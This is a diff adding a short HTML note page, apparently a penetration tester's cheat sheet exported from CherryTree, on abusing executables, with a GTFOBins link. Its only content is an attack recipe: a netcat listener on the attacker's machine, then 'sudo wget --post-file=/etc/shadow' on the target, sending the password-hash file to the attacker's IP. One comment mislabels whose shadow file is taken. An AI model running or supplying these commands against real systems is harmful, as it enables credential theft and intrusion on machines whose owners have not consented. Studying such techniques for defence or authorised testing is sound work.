@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <title>other executables that we can abuse of</title>
+    <meta name="generator" content="CherryTree" />
+    <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+  </head>
+  <body>
+    <div class="page">
+      <h1 class="title">other executables that we can abuse of</h1>
+      <br /><br /><br /><br /><strong>wget</strong> (<a
+        href="https://gtfobins.github.io/gtfobins/wget/#file-upload" target="_blank"
+        >https://gtfobins.github.io/gtfobins/wget/#file-upload</a
+      >)<br />
+      <div class="codebox">
+        <div class="codebox">
+          attacker@kali:/#&nbsp;nc&nbsp;-nvlp&nbsp;8081&nbsp;&nbsp;&nbsp;#set&nbsp;up&nbsp;listener&nbsp;on&nbsp;the&nbsp;attacker<br />target@debian:~$&nbsp;sudo&nbsp;wget&nbsp;--post-file=/etc/shadow&nbsp;[attackerIP]:8081<br />&nbsp;&nbsp;&nbsp;&nbsp;#now&nbsp;the&nbsp;attacker&nbsp;should&nbsp;have&nbsp;received&nbsp;the&nbsp;shadow&nbsp;file&nbsp;of&nbsp;the&nbsp;attacker&nbsp;machine
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
